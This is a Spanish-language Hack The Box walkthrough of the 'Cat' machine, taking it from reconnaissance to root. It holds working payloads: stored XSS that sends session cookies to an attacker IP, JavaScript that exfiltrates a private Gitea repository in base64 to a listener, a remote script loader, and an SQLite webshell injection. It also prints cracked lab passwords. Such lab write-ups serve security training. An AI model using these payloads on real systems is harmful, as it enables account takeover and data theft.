---
title: Cat
description: Cat es una máquina Linux de dificultad media que presenta una aplicación web en PHP vulnerable a Cross-Site Scripting (XSS), el cual puede ser desencadenado mediante un evento onerror para evadir los filtros de seguridad de la aplicación. Aprovechando esta vulnerabilidad XSS, es posible realizar un robo de cookies (cookie hijacking) y obtener la cookie de un administrador para escalar privilegios dentro de la aplicación. Una vez con privilegios elevados, se puede explotar una SQL Injection en una base de datos SQLite para lograr Remote Code Execution (RCE) al almacenar una webshell maliciosa directamente en la base de datos. Con acceso a la base de datos interna de la aplicación, se recupera una contraseña hasheada que, al ser crackeada, permite autenticarse como un usuario con pertenencia a un grupo que tiene permisos para leer los registros del servidor. Estos logs filtran una contraseña en texto claro de un usuario con acceso a una instancia interna de Gitea en su versión 1.22.0, la cual es vulnerable a una vulnerabilidad XSS identificada como CVE-2024-6886 debido a una sanitización incorrecta de entradas. Al explotar CVE-2024-6886, se logra leer un repositorio privado de Gitea que contiene credenciales del usuario root.
date: 2025-02-08
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-cat/cat_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - exposure_of_information_through_directory_listing
  - cross_site_scripting
  - sql_injection
  - code_injection
  - use_of_weak_hash
  - weak_password_requirements
  - insertion_of_sensitive_information_into_log_file
  - reconnaissance
  - active_scanning
  - scanning_ip_blocks
  - vulnerability_scanning
  - gather_victim_host_information
  - software
  - search_victim-owned_websites
  - wordlist_scanning
  - discovery
  - data_from_information_repositories
  - code_repositories
  - initial_access
  - exploit_public-facing_application
  - execution
  - command-and-scripting-interpreter 
  - javascript
  - credential_access
  - steal_web_session_cookie
  - defense_evasion
  - use_alternate_authentication_material
  - web_session_cookie
  - brute_force
  - password_cracking
  - remote_services
  - ssh
  - lateral_movement
  - account_discovery
  - local_account
  - file_and_directory_discovery
  - unsecured_credentials
  - credentials_in_files
  - privilege_escalation
  - collection
  - email_collection
  - local_email_collection
  - network_service_discovery
  - command_and_control
  - protocol_tunneling
  - exploitation_for_client_execution
  - phishing
  - spearphishing_link
  - exfiltration
  - exfiltration_over_c2_channel
  - valid_accounts
  - local_accounts

---
## Reconnaissance

### Active Scanning

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/cat:-$ ping -c 1 10.10.11.53
PING 10.10.11.53 (10.10.11.53) 56(84) bytes of data.
64 bytes from 10.10.11.53: icmp_seq=1 ttl=63 time=252 ms

--- 10.10.11.53 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 252.212/252.212/252.212/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/cat:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.53 -n -Pn -oG nmap1
Host: 10.10.11.53 ()    Status: Up
Host: 10.10.11.53 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/cat:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.53 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0=
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4=
|   256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://cat.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/cat:-$ echo '10.10.11.53\tcat.htb' | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/cat:-$ whatweb cat.htb
http://cat.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.53], Title[Best Cat Competition]
```

---
### Search Victim-Owned Websites

Accedo al servicio web en y visualizo una aplicación centrada en una competencia de gatos, donde los usuarios pueden registrarse, iniciar sesión y emitir votos.

![](assets/img/htb-writeup-cat/cat1_1.png)
![](assets/img/htb-writeup-cat/cat1_2.png)

Luego de completar el registro e iniciar sesión, se habilita una nueva funcionalidad denominada "Register Cat", la cual permite subir un formulario con el perfil de la mascota.

![](assets/img/htb-writeup-cat/cat1_3.png)

---
Haciendo fuzzing aparece expuesto el directorio .git, lo que permite recuperar código fuente y recursos internos <a id="exposure-of-information-through-directory-listing" href="#cwe-548" class="cwe-ref">(CWE-548)</a>.

```terminal
/home/kali/Documents/htb/machines/cat:-$ dirb http://cat.htb
---- Scanning URL: http://cat.htb/ ----
+ http://cat.htb/.git/HEAD (CODE:200|SIZE:23)
```

Utilizo [git-dumper](https://github.com/arthaud/git-dumper) para descargar el contenido del repositorio.

```terminal
(venv)-/home/kali/Documents/htb/machines/cat:-$ /home/kali/Documents/Tools/git-dumper/git_dumper.py http://cat.htb/.git/ ./git
```

Con los archivos obtenidos, buscó funcionalidades críticas en la aplicación web.

```terminal
/home/kali/Documents/htb/machines/cat:-$ tree git -aL 1
git
├── accept_cat.php
├── admin.php
├── config.php
├── contest.php
├── css
├── delete_cat.php
├── .git
├── img
├── img_winners
├── index.php
├── join.php
├── logout.php
├── view_cat.php
├── vote.php
├── winners
└── winners.php
```

El archivo `config.php` indica el uso de SQLite y la presencia local de una base de datos llamada `cat.db`.

```php
<?php
// Database configuration
$db_file = '/databases/cat.db';

// Connect to the database
try {
    $pdo = new PDO("sqlite:$db_file");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error: " . $e->getMessage());
}
?>
```

Dentro de `contest.php`, el código procesa el formulario "Register Cat" y realiza una validación deficiente. El filtrado solo excluye caracteres específicos, pero no previene vectores comunes de inyección como el uso de comillas dobles `"`, lo cual habilita escenarios de XSS <a id="cross-site-scripting" href="#cwe-79" class="cwe-ref">(CWE-79)</a>.

```php
<?php
session_start();

include 'config.php';

// Message variables
$success_message = "";
$error_message = "";

// Check if the user is logged in
if (!isset($_SESSION['username'])) {
    header("Location: /join.php");
    exit();
}

// Function to check for forbidden content
function contains_forbidden_content($input, $pattern) {
    return preg_match($pattern, $input);
}

// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $cat_name = $_POST['cat_name'];
    $age = $_POST['age'];
    $birthdate = $_POST['birthdate'];
    $weight = $_POST['weight'];

    $forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";

    // Check for forbidden content
    if (contains_forbidden_content($cat_name, $forbidden_patterns) ||
        contains_forbidden_content($age, $forbidden_patterns) ||
        contains_forbidden_content($birthdate, $forbidden_patterns) ||
        contains_forbidden_content($weight, $forbidden_patterns)) {
        $error_message = "Your entry contains invalid characters.";
    } else {
        // Generate unique identifier for the image
        $imageIdentifier = uniqid() . "_";
```

La funcionalidad en `accept_cat.php` parece diseñada para usuarios con privilegios elevados, permitiendo aprobar los perfiles de mascotas enviados desde el formulario anterior. Dentro de esta funcionalidad, se incorpora una inyección SQL. La variable `$cat_name` proviene directamente de la entrada del usuario `$_POST['catName']` y es interpolada sin sanitización ni uso de sentencias preparadas, lo que permite un ataque de inyección SQL <a id="sql-injection" href="#cwe-89" class="cwe-ref">(CWE-89)</a>.

```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>
```

---
## Initial Access

### Exploit Public-Facing Application

Este contexto abre múltiples vectores de ataque, siendo uno de los más inmediatos la presencia de un Stored Cross-Site Scripting en el formulario de registro de mascotas y en el de registro de usuarios. Al interactuar con la aplicación, confirmo que los datos ingresados se almacenan y luego se reflejan sin filtrado adecuado, permitiendo la inyección de código JavaScript malicioso <a href="#cwe-79" class="cwe-ref">(CWE-79)</a>.

Dado que una funcionalidad interna permite que un usuario con privilegios elevados revise y apruebe los registros enviados, es posible aprovechar esta interacción para ejecutar código en su navegador y capturar su cookie de sesión.

Inicio un servidor HTTP para recibir conexiones entrantes

```terminal
/home/kali/Documents/htb/machines/cat:-$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Luego, registro una nueva cuenta inyectando un payload XSS en el campo `Username`. Este código establece una conexión hacia mi servidor HTTP, exfiltrando automáticamente los datos del navegador de cualquier usuario que visualice mi perfil. En este caso, envía la cookie de sesión como parámetro en la URL.

```js
Y<script>document.location='http://10.10.16.75:8000/?c='+document.cookie;</script>
```

Luego de completar y enviar el formulario con datos válidos, el payload queda almacenado en el sistema. Minutos después, recibo en los logs del servidor Python una solicitud HTTP con la cookie `PHPSESSID` del usuario que accedió a mi perfil.

{% include embed/video.html src='assets/img/htb-writeup-cat/cat2_1.webm' types='webm' title='Stored Cross-Site Scripting' autoplay=true loop=true muted=true %}

Con herramientas como [cookie editor](https://cookie-editor.com/) o mediante las Developer Tools del navegador, puedo reemplazar mi cookie actual por la capturada (Cookie Hijacking) suplantando al usuario con privilegios elevados.

{% include embed/video.html src='assets/img/htb-writeup-cat/cat2_2.webm' types='webm' title='Cookie Hijacking' autoplay=true loop=true muted=true %}

---

Esta sesión privilegiada me permite acceder al endpoint `admin.php`, encargado de la gestión de formularios enviados por los usuarios. Desde este panel, tengo acceso directo a la funcionalidad vulnerable a SQLi `accept_cat.php` a través del parámetro `catName`.

{% include embed/video.html src='assets/img/htb-writeup-cat/cat2_3.webm' types='webm' title='SQL Injection' autoplay=true loop=true muted=true %}

Aprovechando esta vulnerabilidad <a href="#cwe-89" class="cwe-ref">(CWE-89)</a>, ejecuto sqlmap con los parámetros necesarios para automatizar la explotación y enumerar el contenido de la base de datos.

```terminal
/home/kali/Documents/htb/machines/cat:-$ sqlmap -X POST -u 'http://cat.htb/accept_cat.php' --data 'catName=cat&catId=1' -H 'Cookie: PHPSESSID=5rgrr2os892h1p9t7o9bbjoblk' -p catName --level=5 --tables --dump --risk=3 --dbms=sqlite --threads=10 --batch
```

La herramienta detecta un punto de inyección SQL basado en una condición booleana.

```sql
...[snip]...

sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=cat&catId=1'||(SELECT CHAR(122,88,66,114) WHERE 8831=8831 AND 2472=2472)||'
---
```

Al completar el volcado de la base de datos, recupero cuatro tablas principales.

```terminal
...[snip]...

[4 tables]
+-----------------+
| accepted_cats   |
| cats            |
| sqlite_sequence |
| users           |
+-----------------+
```

Dentro de la tabla users, obtengo once registros, incluyendo nombres de usuario, correos electrónicos y hashes de contraseña.

```terminal
...[snip]...

Table: users
[11 entries]
+---------+-------------------------------+----------------------------------+-------------------------------------------------------------------------------------+
| user_id | email                         | password                         | username                                                                            |
+---------+-------------------------------+----------------------------------+-------------------------------------------------------------------------------------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel                                                                                |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa                                                                                |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert                                                                              |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian                                                                              |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson                                                                            |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry                                                                               |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer                                                                               |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter                                                                               |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel                                                                               |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert                                                                              |
| 11      | y@cat.htb                     | 202cb962ac59075b964b07152d234b70 | Y<script>document.location='http://10.10.16.75:8000/?c='+document.cookie;</script>  |
+---------+-------------------------------+----------------------------------+-------------------------------------------------------------------------------------+
```

---

Una alternativa a sqlmap consiste en explotar manualmente la vulnerabilidad SQL para lograr ejecución remota de código <a id="code-injection" href="#cwe-94" class="cwe-ref">(CWE-94)</a>, utilizando la técnica documentada en [SQLite Remote Code Execution - Attach Database](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-remote-code-execution).

Mediante esta técnica, creo una nueva base de datos con extensión `.php`, lo que permite que su contenido sea interpretado como código PHP por el servidor web. Luego inserto una carga útil con una instrucción que invoca el parámetro `cmd`, creando una webshell funcional.

```sql
catName=cat'); ATTACH DATABASE '/var/www/test.php' as db; CREATE TABLE lol.pwn (stuff text); INSERT INTO lol.pwn (stuff) VALUES ("cmd");-- -&catId=1
```

![](assets/img/htb-writeup-cat/cat2_4.png)

Una vez creada la base de datos maliciosa, accedo al archivo desde el navegador para ejecutar comandos en el sistema bajo el contexto del servidor web `www-data`.

* `http://cat.htb/test.php?cmd=id`

![](assets/img/htb-writeup-cat/cat2_5.png)

Con este acceso, puedo obtener una shell básica como `www-data`, lo que me permite interactuar directamente con el sistema y acceder a la base de datos original, incluyendo los datos previamente identificados en la tabla `users`.

---
### Brute Force

Identifico que los hashes de la tabla users estan utilizando el algoritmo MD5 <a id="use-of-weak-hash" href="#cwe-328" class="cwe-ref">(CWE-328)</a>. Utilizo hashcat para realizar un ataque por diccionario empleando la lista `rockyou.txt`.

```terminal
$ hashcat --show 'ac369922d560f17d6eeb8b2c7dec498c'
   # | Name                                            | Category
=====+=================================================+==============================
   0 | MD5                                             | Raw Hash

$ hashcat -a 3 -m 0 'ac369922d560f17d6eeb8b2c7dec498c' /usr/share/wordlists/rockyou.txt
ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa
```

El hash es crackeado exitosamente y revela la contraseña soyunaprincesarosa, correspondiente al usuario rosa <a id="weak-password-requirements" href="#cwe-521" class="cwe-ref">(CWE-521)</a>.

---
## Lateral Movement

Con estas credenciales, inicio sesión por SSH.

```terminal
/home/kali/Documents/htb/machines/cat:-$ ssh rosa@cat.htb
rosa@cat.htb's password: soyunaprincesarosa

rosa@cat:~$ id
uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
```

Enumerando usuarios del sistema, identifico varias cuentas que disponen de una `bash`.

```terminal
rosa@cat:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
axel:x:1000:1000:axel:/home/axel:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
```

Al pertenecer al grupo `adm`, el usuario `rosa` posee acceso de lectura a archivos del sistema que comparten esta pertenencia.

```terminal
rosa@cat:~$ find / -group 4 2>/dev/null
...[snip]...
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/access.log.2.gz
/var/log/apache2/error.log.1
/var/log/apache2/error.log
/var/log/apache2/error.log.2.gz
/var/log/apache2/other_vhosts_access.log
/var/log/apache2/access.log.1
...[snip]...
```

Encuentro los logs del servidor Apache, correspondientes al sitio web del ranking de gatos analizado anteriormente. Como el formulario de inicio de sesión utilizaba el método `GET`, los parámetros `loginUsername` y `loginPassword` quedaron expuestos en los registros de acceso <a id="insertion-of-sensitive-information-into-log-file" href="#cwe-532" class="cwe-ref">(CWE-532)</a>.

```terminal
rosa@cat:~$ grep 'loginUsername=' /var/log/apache2/access.log | sed -n 's/.*loginUsername=\([^&]*\).*/\1/p' | sort | uniq
axel
test
test321
Y%3Cscript%3Edocument.location%3D%27http%3A%2F%2F10.10.16.75%3A8000%2F%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
```

Confirmo la presencia del payload JavaScript inyectado previamente, junto con usuarios como test y `axel`, quien es un usuario existente en el sistema. De modo que, puedo consultar si el parámetro `loginPassword` presenta alguna contraseña utilizada por `axel`.

```terminal
rosa@cat:~$ grep 'loginUsername=axel' /var/log/apache2/access.log | sed -n 's/.*loginPassword=\([^&]*\).*/\1/p' | uniq
aNdZwgC4tI9gnVXv_e3Q
```

Efectivamente, extraigo una contraseña, con la cual intento iniciar sesión como `axel` por SSH.

```terminal
/home/kali/Documents/htb/machines/cat:-$ ssh axel@cat.htb            
axel@cat.htb's password: aNdZwgC4tI9gnVXv_e3Q
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
...[snip]...
You have mail.

axel@cat:~$ id
uid=1000(axel) gid=1000(axel) groups=1000(axel)

axel@cat:~$ cat user.txt
```

---
## Privilege Escalation

### Email Collection

Al iniciar sesión por SSH, aparece una notificación (`You have mail`) indicando correo nuevo para el usuario actual.

Accedo al buzón de `axel` y encuentro dos mensajes relevantes

```terminal
axel@cat:~$ cat /var/mail/axel
```

![](assets/img/htb-writeup-cat/cat3_1.png)

El primer correo, enviado por `rosa`, solicita que `axel` envíe información sobre su repositorio de Gitea a `jobert@localhost`, destacando que se evaluará la viabilidad del servicio propuesto.

El segundo correo detalla el desarrollo de un sistema de gestión de empleados alojado en un repositorio privado de Gitea accesible vía.

* `http://localhost:3000/administrator/Employee-management/`

Estos mensajes infieren la existencia de una instancia de Gitea en `localhost:3000`.

---
### Network Service Discovery

Verifico los puertos locales activos, encontrando los 25 y 587 correspondientes a servicios de correo SMTP y ESMTP, y el puerto por defecto de Gitea el 3000.

```terminal
axel@cat:~$ ss -tulnp
Netid            State             Recv-Q             Send-Q                         Local Address:Port                          Peer Address:Port            Process            
udp              UNCONN            0                  0                              127.0.0.53%lo:53                                 0.0.0.0:*                                  
tcp              LISTEN            0                  10                                 127.0.0.1:587                                0.0.0.0:*                                  
tcp              LISTEN            0                  128                                127.0.0.1:48499                              0.0.0.0:*                                  
tcp              LISTEN            0                  4096                           127.0.0.53%lo:53                                 0.0.0.0:*                                  
tcp              LISTEN            0                  128                                  0.0.0.0:22                                 0.0.0.0:*                                  
tcp              LISTEN            0                  4096                               127.0.0.1:3000                               0.0.0.0:*                                  
tcp              LISTEN            0                  37                                 127.0.0.1:51353                              0.0.0.0:*                                  
tcp              LISTEN            0                  10                                 127.0.0.1:25                                 0.0.0.0:*                                  
tcp              LISTEN            0                  1                                  127.0.0.1:45951                              0.0.0.0:*                                  
tcp              LISTEN            0                  511                                        *:80                                       *:*                                  
tcp              LISTEN            0                  128                                     [::]:22                                    [::]:*

```

Gitea responde correctamente, lo que me confirma que el servicio esta activo.

```terminal
axel@cat:~$ curl 127.0.0.1:3000 -I
HTTP/1.1 200 OK
Date: Tue, 15 Jul 2025 21:46:11 GMT
```

Ejecuto un port forwarding para exponer el puerto local 3000 del host remoto a mi entorno local.

```terminal
/home/kali/Documents/htb/machines/cat:-$ ssh -L 3000:127.0.0.1:3000 axel@cat.htb -N -f
axel@cat.htb's password: aNdZwgC4tI9gnVXv_e3Q
```

Una vez establecido el túnel, accedo a `http://localhost:3000` desde el navegador y verifico que se está ejecutando `Gitea v1.22.0`.

Esta versión específica es vulnerable a [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/cve-2024-6886), una vulnerabilidad de Stored Cross-Site Scripting <a href="#cwe-79" class="cwe-ref">(CWE-79)</a>. El fallo se origina por una neutralización incorrecta de entradas durante la generación de páginas web, permitiendo la ejecución de scripts maliciosos dentro del contexto de la sesión autenticada.

![](assets/img/htb-writeup-cat/cat3_2.png)

---
### Exploitation for Client Execution

Siguiendo los pasos que se explican en [exploit-db](https://www.exploit-db.com/exploits/52077) soy capaz de ejecutar una alert box interactuando con la descripcion del proyecto creado. la clave esta en In the Description field, input the following payload

```js
<a href=javascript:alert()>XSS test</a>
```

{% include embed/video.html src='assets/img/htb-writeup-cat/cat3_3.webm' types='webm' title='CVE-2024-6886' autoplay=true loop=true muted=true %}

Como se mencionaba en el correo enviado por `rosa`, el usuario `jacob` espera recibir de parte de `axel` un enlace a su repositorio, con el objetivo de revisarlo exhaustivamente. Aprovechando esta expectativa, resulta viable crear un nuevo proyecto malicioso que, al ser accedido por `jacob`, se ejecute XSS con el objetivo de exfiltrar información sensible.

El payload inyectado en la descripción del proyecto consiste en un enlace con código JavaScript embebido que leé el contenido de un archivo existente en el perfil del administrador `/administrator/Employee-management/raw/branch/main/README.md` y lo envía codificado en base64 a un servidor controlado.

```js
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response => response.text()).then(data => fetch("http://10.10.16.75:8000/?exfil="+btoa(data)));'>XSS</a>
```

![](assets/img/htb-writeup-cat/cat3_4.png)

Para que el campo vulnerable sea procesado correctamente por el visor de Gitea en la ruta `http://127.0.0.1:3000/axel/test`, era necesario inicializar el repositorio localmente, activarlo y realizar un push del contenido hacia el servidor.

```terminal
/home/kali/Documents/htb/machines/cat:-$ touch README.md
/home/kali/Documents/htb/machines/cat:-$ git init
/home/kali/Documents/htb/machines/cat:-$ git checkout -b main
/home/kali/Documents/htb/machines/cat:-$ git add README.md
/home/kali/Documents/htb/machines/cat:-$ git commit -m "first commit"
/home/kali/Documents/htb/machines/cat:-$ git remote add origin http://127.0.0.1:3000/axel/test.git
/home/kali/Documents/htb/machines/cat:-$ git push -u origin main
Username for 'http://127.0.0.1:3000': axel
Password for 'http://axel@127.0.0.1:3000': aNdZwgC4tI9gnVXv_e3Q
```

Levantó un servidor HTTP para capturar las solicitudes exfiltradas en base64.

```terminal
$ python3 -m http.server
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y luego, envío del correo esperado por `jacob`, apuntando al repositorio.

```terminal
axel@cat:~$ echo -e "Subject: Test Email\n\nHello Jobert, check the repo http://localhost:3000/axel/test" | sendmail jobert@localhost
```

Al momento en que `jacob` accedió al enlace, el navegador ejecutó el código malicioso, y se registró en el listener una solicitud HTTP con el contenido del archivo exfiltrado.

```terminal
	... 10.10.11.53 - - [16/Jul/2025 00:54:28] "GET /?exfil=IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu HTTP/1.1" 200 - 

/home/kali/Documents/htb/machines/cat:-$ echo 'IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu' | base64 -d
# Employee Management
Site under construction. Authorized user: admin. No visibility or updates visible to employees.
```

---

Con la capacidad de exfiltrar archivos mediante Stored XSS, apunto a descargar el contenido completo del proyecto `Employee-management`.

Aprovechando el servidor HTTP local, expongo el archivo `xss.js` para que cargarse en la página de `jacob` y realize las siguientes acciones.
* Solicitar un archivo ZIP del repositorio `/administrator/Employee-management/archive/main`.
* Convertir el contenido binario a base64.
* Enviar el payload codificado a mi listener HTTP en el puerto 4444.

```js
/home/kali/Documents/htb/machines/cat:-$ cat xss.js
let xhr = new XMLHttpRequest();
xhr.open('GET', '/administrator/Employee-management/archive/main.zip', true);
xhr.responseType = 'arraybuffer';
xhr.send();
 
xhr.onload = function() {
    let buffer = xhr.response;
    let binary = new Uint8Array(buffer).reduce((data, byte) => data + String.fromCharCode(byte), '');
    let payload = btoa(binary);
 
    let exfil = new XMLHttpRequest();
    exfil.open('POST', 'http://10.10.16.75:4444/exfil');
    exfil.send(payload);
};

xhr.send();
```

Actualicé la descripción del proyecto con nuevo código que apunta al archivo `xss.js` alojado en mi servidor HTTP. De modo, que el navegador de `jacob` carga y ejecuta el contenido malicioso sin intervención directa adicional.

```js
<a href='javascript:(
    function () {
        var abc = document.createElement("script");
        abc.setAttribute("src","http://10.10.16.75:8000/xss.js");
        document.head.appendChild(abc);
    }
)();'>XSS</a>
```

![](assets/img/htb-writeup-cat/cat3_5.png)

Dado que existe un proceso que elimina los proyectos realicé un nuevo push para reactivarlo y dejar accesible el vector de ejecución.

```terminal
/home/kali/Documents/htb/machines/cat:-$ git push -u origin main
Username for 'http://127.0.0.1:3000': axel
Password for 'http://axel@127.0.0.1:3000': aNdZwgC4tI9gnVXv_e3Q
```

---
### Exfiltration Over C2 Channel

Lanzo netcat en escucha a la espera del archivo exfiltrado `main.b64` y envío nuevamente un correo a `jacob@localhost`.

```terminal
/home/kali/Documents/htb/machines/cat:-$ nc -lnvp 4444 > main.b64
	listening on [any] 4444 ...

axel@cat:~$ echo -e "Subject: Test Email\n\nHello Jobert, check the repo http://localhost:3000/axel/test" | sendmail jobert@localhost

	... 10.10.11.53 - - [16/Jul/2025 01:04:06] "GET /xss.js HTTP/1.1" 200 -

	... connect to [10.10.16.75] from (UNKNOWN) [10.10.11.53] 56286
```

El payload exfiltra correctamente el archivo `main.b64`. Extraigo su contenido utilizando base64 y lo descomprimo.

```terminal
/home/kali/Documents/htb/machines/cat:-$ tail -n 1 main.b64 | base64 -d > main.zip

/home/kali/Documents/htb/machines/cat:-$ unzip main.zip 
Archive:  main.zip
7fa272fd5c07320c932584e150717b4829a0d0b3
   creating: employee-management/
  inflating: employee-management/README.md  
  inflating: employee-management/chart.min.js  
  inflating: employee-management/dashboard.php  
  inflating: employee-management/index.php  
  inflating: employee-management/logout.php  
  inflating: employee-management/style.css
```

Dentro de `index.php` encuentro credenciales hardcodedadas utilizadas para una autenticación básica.

```terminal
/home/kali/Documents/htb/machines/cat:-$ cat employee-management/index.php
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
```

Utilizo la contraseña encontrada para iniciar sesión como `root` y obtengo acceso con privilegios máximos.

```terminal
axel@cat:~$ su root
Password: IKw75eR0MR7CMIxhH0

root@cat:/home/axel# id
uid=0(root) gid=0(root) groups=0(root)

root@cat:/home/axel# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/646" target="_blank">Cat Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }

---
## Common Weakness

| CWE ID | Name | Description |
| :--- | :--- | :--- |
| <a id="cwe-548" href="https://cwe.mitre.org/data/definitions/548.html" target="_blank">CWE-548</a> | <a href="#exposure-of-information-through-directory-listing" class="vuln-ref">Exposure of Information Through Directory Listing</a> | The product inappropriately exposes a directory listing with an index of all the resources located inside of the directory.
